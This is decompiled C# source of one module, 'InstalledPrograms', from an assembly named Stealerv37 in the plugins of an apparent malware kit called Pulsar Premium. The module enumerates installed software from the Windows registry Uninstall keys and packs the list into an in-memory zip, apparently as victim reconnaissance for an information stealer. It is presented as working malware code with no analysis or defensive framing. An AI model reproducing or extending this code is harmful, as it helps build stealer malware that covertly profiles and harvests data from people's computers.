// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Device.InstalledPrograms
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using Microsoft.Win32;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

#nullable disable
namespace Intelix.Targets.Device;

public class InstalledPrograms : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    List<InstalledPrograms.InstalledProgram> list = ((IEnumerable<string>) new string[2]
    {
      "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
      "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
    }).SelectMany<string, InstalledPrograms.InstalledProgram>((Func<string, IEnumerable<InstalledPrograms.InstalledProgram>>) (key => InstalledPrograms.GetInstalledPrograms(key, Registry.LocalMachine, counter).Concat<InstalledPrograms.InstalledProgram>((IEnumerable<InstalledPrograms.InstalledProgram>) InstalledPrograms.GetInstalledPrograms(key, Registry.CurrentUser, counter)))).ToList<InstalledPrograms.InstalledProgram>();
    if (list.Count == 0)
      return;
    int maxName = Math.Max("Name".Length, list.Max<InstalledPrograms.InstalledProgram>((Func<InstalledPrograms.InstalledProgram, int>) (p =>
    {
      string name = p.Name;
      return name == null ? 0 : name.Length;
    })));
    int maxVersion = Math.Max("Version".Length, list.Max<InstalledPrograms.InstalledProgram>((Func<InstalledPrograms.InstalledProgram, int>) (p =>
    {
      string version = p.Version;
      return version == null ? 0 : version.Length;
    })));
    int maxPath = Math.Max("Path".Length, list.Max<InstalledPrograms.InstalledProgram>((Func<InstalledPrograms.InstalledProgram, int>) (p =>
    {
      string installLocation = p.InstallLocation;
      return installLocation == null ? 0 : installLocation.Length;
    })));
    List<string> values = new List<string>()
    {
      $"{"Name".PadRight(maxName)} | {"Path".PadRight(maxPath)} | {"Version".PadRight(maxVersion)}",
      new string('-', maxName + maxPath + maxVersion + 6)
    };
    values.AddRange(list.Select<InstalledPrograms.InstalledProgram, string>((Func<InstalledPrograms.InstalledProgram, string>) (p => $"{(p.Name ?? "Unknown").PadRight(maxName)} | {(p.InstallLocation ?? "Unknown").PadRight(maxPath)} | {(p.Version ?? "Unknown").PadRight(maxVersion)}")));
    zip.AddTextFile("InstalledPrograms.txt", string.Join("\n", (IEnumerable<string>) values));
  }

  private static List<InstalledPrograms.InstalledProgram> GetInstalledPrograms(
    string uninstallKey,
    RegistryKey root,
    Counter counter)
  {
    ConcurrentBag<InstalledPrograms.InstalledProgram> installedPrograms = new ConcurrentBag<InstalledPrograms.InstalledProgram>();
    using (RegistryKey registryKey1 = root.OpenSubKey(uninstallKey))
    {
      if (registryKey1 == null)
        return new List<InstalledPrograms.InstalledProgram>();
      string[] subKeyNames = registryKey1.GetSubKeyNames();
      if (subKeyNames == null || subKeyNames.Length == 0)
        return new List<InstalledPrograms.InstalledProgram>();
      Parallel.ForEach<string>((IEnumerable<string>) subKeyNames, (Action<string>) (subkeyName =>
      {
        try
        {
          using (RegistryKey registryKey2 = root.OpenSubKey($"{uninstallKey}\\{subkeyName}"))
          {
            string str3 = registryKey2?.GetValue("DisplayName") as string;
            if (string.IsNullOrEmpty(str3))
              return;
            InstalledPrograms.InstalledProgram installedProgram = new InstalledPrograms.InstalledProgram();
            installedProgram.Name = str3.Trim();
            if (!(registryKey2.GetValue("DisplayVersion") is string str4))
              str4 = "Unknown";
            installedProgram.Version = str4;
            if (!(registryKey2.GetValue("InstallLocation") is string str5))
              str5 = "Unknown";
            installedProgram.InstallLocation = str5;
            installedPrograms.Add(installedProgram);
          }
        }
        catch
        {
        }
      }));
    }
    return installedPrograms.ToList<InstalledPrograms.InstalledProgram>();
  }

  private class InstalledProgram
  {
    public string Name { get; set; }

    public string Version { get; set; }

    public string InstallLocation { get; set; }
  }
}
